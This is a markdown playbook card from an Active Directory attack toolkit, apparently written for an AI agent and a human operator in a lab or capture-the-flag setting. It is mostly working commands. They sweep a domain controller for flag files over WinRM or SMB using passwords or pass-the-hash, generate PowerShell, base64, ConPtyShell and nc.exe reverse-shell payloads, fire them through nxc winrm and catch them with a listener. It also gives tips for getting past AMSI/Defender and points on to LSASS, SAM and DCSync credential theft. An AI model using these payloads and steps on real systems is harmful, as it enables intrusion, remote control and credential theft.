# Reverse shell + flag finder (senior)

You already have code exec (`shells.md`). This card is about **not** wasting a
dozen MCP round-trips (tokens) on one-off `atexec 'type flag.txt'` calls.

Public tools only (PowerShell TCP / ConPtyShell / nc.exe) — same category as
`evil-winrm`/`psexec`. No third-party C2, no malware. Lab / RoE only.

**DC only.** The takeover flag lives on the domain controller's Administrator
desktop. `flags` targets the DC and refuses a non-DC host unless you pass
`--any` — don't fan reverse shells across member servers to hunt a flag. The DC
is read from `$ADTK_DC` (the MCP server exports it from the current target), so
the IP is usually optional.

## Two paths — pick by intent

- **Just want the flag / a couple of files → one-shot sweep on the DC.** Do not
  open an interactive shell for this. One command finds and prints every flag:

```
/opt/adtk/revshell.sh flags -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}}          # DC from $ADTK_DC
/opt/adtk/revshell.sh flags {{DC}} -u Administrator -H {{HASH}} -d {{DOMAIN}}
/opt/adtk/revshell.sh flags {{DC}} -u Administrator -H {{HASH}} --exec smb    # 5985 closed
```

  It runs a single WinRM `powershell` sweep of the DC's `C:\Users\**` + `C:\`
  for `user.txt` / `root.txt` / `flag*.txt` / `proof.txt` and prints
  `path: contents`. `--exec smb` falls back to reading the usual desktop flags
  off the DC's `C$`. A member-server flag (rare) needs an explicit IP + `--any`.

- **Need to explore interactively → real reverse shell, in a tty.** Catch it in
  an interactive `docker exec -it` / `ssh` session, **never over MCP** — the
  ~30s host cap kills a held-open shell. The agent should hand the operator the
  two commands and step back (zero agent tokens while they browse).

```
# 1. print a payload (fire it with your existing exec channel)
/opt/adtk/revshell.sh payload {{LHOST}} 4444 ps        # PowerShell TCP one-liner
/opt/adtk/revshell.sh payload {{LHOST}} 4444 psb64     # base64 -enc form for -x
/opt/adtk/revshell.sh payload {{LHOST}} 4444 conpty    # fully-interactive PTY
/opt/adtk/revshell.sh payload {{LHOST}} 4444 nc        # nc.exe upload+exec

# 2. fire it (session-0 caveat from shells.md still applies):
nxc winrm {{DC}} -u {{USER}} -p '{{PASS}}' -x '<paste the payload>'

# 3. catch it (in a tty, not MCP):
/opt/adtk/revshell.sh listen 4444
```

## Read this

- The one-shot sweep is the default. Reach for an interactive shell only when a
  single command will not do (browsing, staged privesc, LSASS work).
- `exit 124` after firing a synchronous payload usually means it is **alive**
  (the shell held the channel) — check `tasklist` from a fresh session before
  retrying, don't re-fire. Same lesson as `shells.md` GUI payloads.
- Reverse shells over VPN: clamp `tun0` MTU 1200 first or the shell wedges on
  large output (`preflight.sh`).
- Do not paste secrets straight into `bash -c "…"` — `$`/`!` mangle. The helper
  quotes for you; hand-built one-liners go in a quoted-heredoc script.

## Fail → next

| Symptom | Next |
| --- | --- |
| flag sweep prints nothing | wrong exec method — try `--exec smb`, or you are not admin on the DC |
| `is not the DC ($ADTK_DC=…)` | you pointed at a member server — target the DC, or `--any` if the flag really is off-DC |
| WinRM closed (no 5985) | `revshell.sh flags … --exec smb` (C$), or `atexec 'type …'` one file at a time |
| payload fires then dies instantly | AMSI/Defender on a WS2019+ box — use `conpty` served over HTTP, or dump the file over SMB instead of shelling |
| shell connects then hangs on `dir` | VPN MTU — `ip link set dev tun0 mtu 1200` |
| need upload/download from the shell | catch with `pwncat-cs -lp PORT` instead of nc |

## Chain

Owned the DC → `revshell.sh flags` for the proof, or a tty reverse shell for
real work → `onhost.md` (LSASS / SAM / creds). The takeover proof is still
DCSync (`steps.md` §16), not a flag.
